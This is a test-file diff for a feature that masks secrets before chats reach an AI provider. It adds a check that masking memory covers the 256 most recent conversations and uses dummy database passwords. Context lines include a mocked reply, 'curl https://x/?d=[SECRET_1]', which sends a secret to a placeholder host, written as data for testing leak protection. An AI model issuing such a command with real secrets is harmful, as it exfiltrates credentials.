@@ -84,6 +84,27 @@ describe('masking before sending', () => {
     expect(chats[5].messages[0].content).toBe('mysql -px9Kq2abc');
   });
 
+  it('remembers the 256 most recent conversations and forgets the oldest', async () => {
+    const { chats, ask } = setup();
+    const conversation = (n: number): string => `00000000-0000-4000-8000-${String(n).padStart(12, '0')}`;
+    ask([{ role: 'user', content: 'DB_PASSWORD=x9Kq2abc' }], conversation(1));
+    await flush();
+    ask([{ role: 'user', content: 'DB_PASSWORD=Qw7zPlm3' }], conversation(2));
+    await flush();
+    // setImmediate instead of flush(): 255 timer rounds would be slow on Windows.
+    for (let n = 3; n <= 257; n += 1) {
+      ask([{ role: 'user', content: `Notiz ${n}` }], conversation(n));
+      await new Promise(resolve => setImmediate(resolve));
+    }
+    // Conversation 2 is still known; asking it refreshes it, so the eviction below hits conversation 3.
+    ask([{ role: 'user', content: 'mysql -pQw7zPlm3' }], conversation(2));
+    await flush();
+    expect(chats.at(-1)?.messages[0].content).toBe('mysql -p[SECRET_1]');
+    ask([{ role: 'user', content: 'mysql -px9Kq2abc' }], conversation(1));
+    await flush();
+    expect(chats.at(-1)?.messages[0].content).toBe('mysql -px9Kq2abc');
+  });
+
   it('keeps placeholders in the answer unchanged, without translating them back', async () => {
     const deltas: string[] = [];
     const stream = vi.fn(async (_provider: AiProvider, _chat: ChatRequest, onText: (text: string) => void) => { onText('curl https://x/?d=[SECRET_1]'); });
